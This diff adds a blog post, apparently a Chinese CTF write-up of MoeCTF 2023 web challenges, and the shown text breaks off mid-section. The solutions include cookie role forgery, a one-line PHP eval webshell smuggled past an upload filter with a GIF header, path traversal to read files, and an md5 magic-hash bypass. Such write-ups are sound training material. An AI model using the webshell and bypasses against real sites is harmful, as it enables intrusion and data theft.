@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="MoeCTF_2023web方向WP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MoeCTF_2023web">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/28713.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="MoeCTF_2023web方向WP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bc62d8d0e0a243d4039e35.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bc6396d0e0a243d4039f02.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bc66dfd0e0a243d403a31a.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bc670ed0e0a243d403a345.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bc86ccd0e0a243d403b5b3.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bc8dbed0e0a243d403b736.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bc8df2d0e0a243d403b73e.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bc8ff0d0e0a243d403b775.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bc943dd0e0a243d403bbc7.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bc947cd0e0a243d403bc25.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bc9523d0e0a243d403bd22.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bc9621d0e0a243d403be27.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bc9e46d0e0a243d403c4ea.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bc9e8cd0e0a243d403c4f4.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67be7785d0e0a243d405d388.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67be8722d0e0a243d405d7eb.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bece3dd0e0a243d405f9b9.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bed461d0e0a243d405fe71.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bf311bd0e0a243d40647f3.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bef510d0e0a243d40613c4.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bef77bd0e0a243d40614ff.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bf03afd0e0a243d40619ae.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67bf336ed0e0a243d40649bf.png">
+<meta property="article:published_time" content="2025-02-24T11:56:21.000Z">
+<meta property="article:modified_time" content="2025-02-26T15:31:02.523Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67bc62d8d0e0a243d4039e35.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/28713.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>MoeCTF_2023web | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">13</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">52</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/28713.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MoeCTF_2023web
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-02-24 19:56:21" itemprop="dateCreated datePublished" datetime="2025-02-24T19:56:21+08:00">2025-02-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-02-26 23:31:02" itemprop="dateModified" datetime="2025-02-26T23:31:02+08:00">2025-02-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+      
+      
+        <p>MoeCTF_2023web方向WP</p>
+<span id="more"></span>
+
+<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>下载readme文件<br><img src="https://pic1.imgdb.cn/item/67bc62d8d0e0a243d4039e35.png"><br>根据readme中的内容，用POST请求发送json数据创建用户<br><img src="https://pic1.imgdb.cn/item/67bc6396d0e0a243d4039f02.png"><br>但是在登录的时候发现密码错误，那我们就自己创建一个用户<br>登录之后会得到一个cookie<br>base64解码一下得到</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> eyJ1c2VybmFtZSI6ICJoYWNrZXIiLCAicGFzc3dvcmQiOiAiMTIzNDU2IiwgInJvbGUiOiAidXNlciJ9  | <span class="built_in">base64</span> -d</span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;hacker&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>&#125;   </span><br></pre></td></tr></table></figure></div>
+<p>这里我们的role是user，修改成admin然后再base64一下,把修改过的cookie再放在这个login界面登录，成功<br><img src="https://pic1.imgdb.cn/item/67bc66dfd0e0a243d403a31a.png"><br>最后访问&#x2F;flag 拿到flag</p>
+<p><img src="https://pic1.imgdb.cn/item/67bc670ed0e0a243d403a345.png"></p>
+<h1 id="web入门指北"><a href="#web入门指北" class="headerlink" title="web入门指北"></a>web入门指北</h1><p>在md文件中最后是这题要解码的内容，这是一个十六进制字符串<br>可用在cyberchef这个平台上解码，我直接用kali了，解码后是一个base64字符串，再解码得到flag</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> <span class="string">&quot;666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c5131524758316379596c396a61474673624756755a3055684958303d&quot;</span> | xxd -r -p</span><br><span class="line">flag=bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0=                                                                                                                                                         </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0= | <span class="built_in">base64</span> -d                                                                     </span><br><span class="line">moectf&#123;w3lCome_To_moeCTF_W2b_challengE!!&#125;  </span><br></pre></td></tr></table></figure></div>
+
+<h1 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h1><p><img src="https://pic1.imgdb.cn/item/67bc86ccd0e0a243d403b5b3.png"><br>这里就像一个小游戏,但是在这么短的时间内做完这个反应还是有点难，写一个python脚本吧<br>首先先看这个页面的源代码，在这里可以找到参数传递的方法</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--maybe id can help you locate the information--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;info&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>比赛开始！<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span>弯道向左，抓地力太小了！<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;driver&quot;</span>&gt;</span>选手:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;steering_control&quot;</span>&gt;</span>方向控制:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;steering_control&quot;</span> <span class="attr">name</span>=<span class="string">&quot;steering_control&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;-1&quot;</span>&gt;</span>左<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> <span class="attr">selected</span>&gt;</span>直行<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>右<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;throttle&quot;</span>&gt;</span>油门控制:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;throttle&quot;</span> <span class="attr">name</span>=<span class="string">&quot;throttle&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span>松开<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>保持<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span> <span class="attr">selected</span>&gt;</span>全开<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>然后这里我们知道提交的方式是POST，然后找到每一个数据的ID，这里有<code>driver</code> <code>steering_control</code> <code>throttle</code><br>这里就根据每次传递数据之后返回的结果来决定下一次的数</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="attr">url</span> <span class="operator">=</span> &#x27;http:<span class="operator">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">62839</span><span class="operator">/</span>&#x27;</span><br><span class="line">s<span class="attr">ession</span> <span class="operator">=</span> requests.session()</span><br><span class="line"></span><br><span class="line"><span class="attr">response</span> <span class="operator">=</span> session.post(url,data<span class="operator">=</span>&#123;<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;kakeru&quot;</span>,<span class="string">&quot;steering_control&quot;</span>:<span class="number">0</span>,<span class="string">&quot;throttle&quot;</span>:<span class="number">0</span>&#125;) <span class="comment">#先发送一次请求，根据结果操作</span></span><br><span class="line"></span><br><span class="line">for i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="attr">text</span> <span class="operator">=</span> response.text</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方向控制，和返回的方向相反</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;向左&quot;</span> <span class="keyword">in</span> <span class="params">text:</span></span><br><span class="line">        <span class="attr">data_1</span> <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    elif <span class="string">&quot;向右&quot;</span> <span class="keyword">in</span> <span class="params">text:</span></span><br><span class="line">        <span class="attr">data_1</span> <span class="operator">=</span> <span class="operator">-</span><span class="number">1</span></span><br><span class="line">    <span class="params">else :</span></span><br><span class="line">        <span class="attr">data_1</span> <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 抓地力判断，油门越大，抓地力越小</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;太小&quot;</span> <span class="keyword">in</span> <span class="params">text:</span></span><br><span class="line">        <span class="attr">data_2</span> <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">    elif <span class="string">&quot;太大&quot;</span> <span class="keyword">in</span> <span class="params">text:</span></span><br><span class="line">        <span class="attr">data_2</span> <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">    <span class="params">else:</span></span><br><span class="line">        <span class="attr">data_2</span> <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="attr">Data</span> <span class="operator">=</span> &#123;</span><br><span class="line">        <span class="string">&quot;driver&quot;</span> : <span class="string">&quot;kakeru&quot;</span>,</span><br><span class="line">        <span class="string">&quot;steering_control&quot;</span> : data_1,</span><br><span class="line">        <span class="string">&quot;throttle&quot;</span> : data_2</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attr">response</span> <span class="operator">=</span> session.post(url,data <span class="operator">=</span> Data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;moectf&#123;&quot;</span> <span class="keyword">in</span> response.<span class="params">text :</span></span><br><span class="line">        print(response.text)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/67bc8dbed0e0a243d403b736.png"></p>
+<h1 id="http"><a href="#http" class="headerlink" title="http"></a>http</h1><p><img src="https://pic1.imgdb.cn/item/67bc8df2d0e0a243d403b73e.png"><br>这题就是要求我们对http头修改<br><img src="https://pic1.imgdb.cn/item/67bc8ff0d0e0a243d403b775.png"></p>
+<h1 id="meo-图床"><a href="#meo-图床" class="headerlink" title="meo 图床"></a>meo 图床</h1><p>一道文件上传题目<br>上传一个一句话木马的php文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>
+<p>提示： 只允许上传图片文件（JPEG、PNG 或 GIF）。<br>先考虑是不是只是在前端做校验，改成jpg文件，然后bp发包改成php后缀<br>上传之后还是不行<br><img src="https://pic1.imgdb.cn/item/67bc943dd0e0a243d403bbc7.png"><br>但是再添加一个GIF头就可以了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/67bc947cd0e0a243d403bc25.png"><br>这里先尝试用蚁剑连接，但是失败了<br><img src="https://pic1.imgdb.cn/item/67bc9523d0e0a243d403bd22.png"><br>文件已经成功上传，但是无法连接 –&gt; 所以就要转换思路<br>看到这里访问文件的方式很特别，直接用get请求访问这个图片的位置，那就有可能存在本地文件包含漏洞<br>验证一下，发现确实可以<br><img src="https://pic1.imgdb.cn/item/67bc9621d0e0a243d403be27.png"><br>然后访问<code>../../../../../flag</code> </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hello~</span><br><span class="line">Flag Not Here~</span><br><span class="line">Find Somewhere Else~</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--Fl3g_n0t_Here_dont_peek!!!!!.php--&gt;</span></span><br><span class="line"></span><br><span class="line">Not Here~~~~~~~~~~~~~ awa</span><br></pre></td></tr></table></figure></div>
+<p>再去这新的flag地址<br>得到一个源码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$param1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;param1&#x27;</span>];</span><br><span class="line">    <span class="variable">$param2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$param1</span> !== <span class="variable">$param2</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$md5Param1</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$param1</span>);</span><br><span class="line">        <span class="variable">$md5Param2</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$param2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$md5Param1</span> == <span class="variable">$md5Param2</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;O.O!! &quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;O.o??&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;o.O?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;O.o?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> O.o?</span><br></pre></td></tr></table></figure></div>
+<p>就是输入两个不一样的值然后它们的md5值一样，这很经典了<br><code>http://127.0.0.1:55659/Fl3g_n0t_Here_dont_peek!!!!!.php?param1=240610708&amp;param2=QNKCDZO</code><br>得到flag</p>
+<h1 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h1><p>还是一个文件上传。这题是提示只允许后缀是png的文件，还是先用bp改一下后缀试试,改完显示后缀名不符合要求<br>目录扫一下，发现有个upload.php</p>
